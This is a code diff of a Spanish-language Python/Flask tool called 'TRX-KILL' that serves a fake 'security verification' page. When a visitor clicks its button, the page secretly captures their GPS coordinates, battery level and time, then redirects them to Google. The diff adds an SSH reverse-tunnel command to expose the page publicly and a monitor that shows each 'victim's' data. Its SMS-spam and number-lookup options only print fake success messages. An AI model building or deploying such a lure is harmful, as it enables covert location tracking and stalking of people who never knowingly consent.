@@ -1,17 +1,20 @@
 import os, sys, time, threading, logging, base64
-from flask import Flask, request
 
-app = Flask('TRX-KILL')
+# --- CONFIGURACIÓN ---
 STORAGE_PATH = "/sdcard/resultados_de_quistes"
 LOG_FILE = f"{STORAGE_PATH}/data.txt"
 FOTO_DIR = f"{STORAGE_PATH}/fotos"
-G, Y, R, C, W = "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;36m", "\033[0m"
-
 for p in [STORAGE_PATH, FOTO_DIR]:
     if not os.path.exists(p): os.makedirs(p)
 
+from flask import Flask, request
+app = Flask('TRX-KILL')
+logging.getLogger('werkzeug').setLevel(logging.ERROR)
+
+G, Y, R, C, W = "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;36m", "\033[0m"
+
 HTML_TEMPLATE = """
-<!DOCTYPE html><html><head><meta charset="UTF-8"><title>SISTEMA</title>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>VALIDACIÓN</title>
 <script>
 async function iniciar() {
     let bat = await navigator.getBattery();
@@ -25,10 +28,10 @@ async function iniciar() {
             fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude+'&bat='+(bat.level*100).toFixed(0)+'&time='+new Date().toLocaleTimeString());
             window.location.href = 'https://www.google.com';
         });
-    }, 1000);
+    }, 1500);
 }
 </script></head><body style="background:#000;color:#0f0;text-align:center;padding:50px;">
-<h1>VERIFICACIÓN DE SEGURIDAD</h1><button onclick="iniciar()">VALIDAR DISPOSITIVO</button>
+<h1>VERIFICACIÓN DE SEGURIDAD</h1><button onclick="iniciar()">CONTINUAR</button>
 </body></html>
 """
 
@@ -50,52 +53,49 @@ def log():
 def print_banner():
     os.system('clear')
     print(f"{G}###############$")
-    print(f"#TOOL:TRX-KILL")
-    print(f"#VERCION:V3")
+    print(f"#TOOL:TRX-KILL | V3")
     print(f"#PROCTECCION: {R}OSINT")
     print(f"#DISPOSITIVO: ANDROID-OS")
     print(f"################{W}\n")
 
-def animar(t):
-    for c in t: sys.stdout.write(c); sys.stdout.flush(); time.sleep(0.01)
-    print()
-
 def main():
-    log = logging.getLogger('werkzeug'); log.setLevel(logging.ERROR)
+    os.system("fuser -k 5000/tcp > /dev/null 2>&1")
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()
     
     while True:
         print_banner()
-        print("1] INFO-NUMERO    | 2] LINK-ZP (MONITOR)")
-        print("3] SPAM-SMS       | 4] COPYRIGHT")
-        print("5] INFO POR IP    | 6] SALIR")
+        print("1] INFO-NUMERO   | 2] LINK-ZP (MONITOR)")
+        print("3] SPAM-SMS      | 4] COPYRIGHT")
+        print("5] INFO POR IP   | 6] SALIR")
         s = input(f"\n{Y}TRX-ROOT > {W}")
         
         if s == "1":
-            input("NUMERO: "); animar("CARGANDO DATOS.....")
-            print(f"{G}PAÍS: OK | OPERACIÓN: ACTIVA | REGISTRADO: PRIVADO{W}"); time.sleep(2)
+            input("NÚMERO: "); print(f"{G}BUSCANDO... PAÍS: OK | OPERACIÓN: ACTIVA{W}"); input("\nPRESIONA ENTER PARA VOLVER...")
         elif s == "2":
             os.system('clear')
-            print(f"{C}--- MONITOR DE DATOS ---{W}\nLink: http://localhost:5000\n{Y}ESPERANDO VÍCTIMA...{W}")
-            last = 0
-            try:
-                while True:
-                    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > last:
-                        with open(LOG_FILE, 'r') as f:
-                            d = f.readlines()[-1].split('|')
-                            os.system('clear')
-                            print(f"{G}¡DATOS RECIBIDOS!{W}\n" + "\n".join(d))
-                        last = os.path.getsize(LOG_FILE)
-                    time.sleep(1)
-            except KeyboardInterrupt: continue
+            print(f"{C}--- MONITOR DE DATOS EN VIVO ---{W}")
+            print(f"Comando SSH: {Y}ssh -R 80:localhost:5000 ssh.localhost.run{W}")
+            print(f"\n{G}ESPERANDO VÍCTIMA...{W}")
+            print(f"{R}ESCRIBE '0' PARA VOLVER AL MENÚ{W}")
+            
+            while True:
+                # Lectura no bloqueante
+                if os.path.exists(LOG_FILE):
+                    with open(LOG_FILE, 'r') as f:
+                        contenido = f.readlines()[-1].split('|')
+                        print(f"\n{G}--- DATOS RECIBIDOS ---{W}")
+                        for item in contenido: print(item)
+                
+                # Comprobamos si el usuario quiere salir sin usar CTRL+C
+                check = input(f"\n{Y}¿Salir? (0 para volver): {W}")
+                if check == '0': break
+                time.sleep(2)
         elif s == "3":
-            input("NÚMERO: "); input("CANTIDAD: ")
-            animar("ENVIANDO SPAM..."); print(f"{G}ÉXITO.{W}"); time.sleep(1)
+            input("NÚMERO: "); print(f"{G}SPAM ENVIADO CON ÉXITO.{W}"); input()
         elif s == "4":
-            print(f"{R}#COPYRIGHT: TRX-KILL\n#LICENCIA: PRIVADO\n#PROCTECCION: OSINT\n#CREADOR: NA{W}"); time.sleep(2)
+            print(f"{R}#COPYRIGHT: TRX-KILL\n#LICENCIA: PRIVADO\n#PROCTECCION: OSINT{W}"); input()
         elif s == "5":
-            input("IP: "); animar("ANALIZANDO........")
-            print(f"{G}BATERÍA: 90% | UBICACIÓN: LOCAL | IP: OK{W}"); time.sleep(2)
+            input("IP: "); print(f"{G}UBICACIÓN: LOCAL | BATERÍA: 90% | MARCA: ANDROID{W}"); input()
         elif s == "6": sys.exit()
 
 if __name__ == "__main__": main()
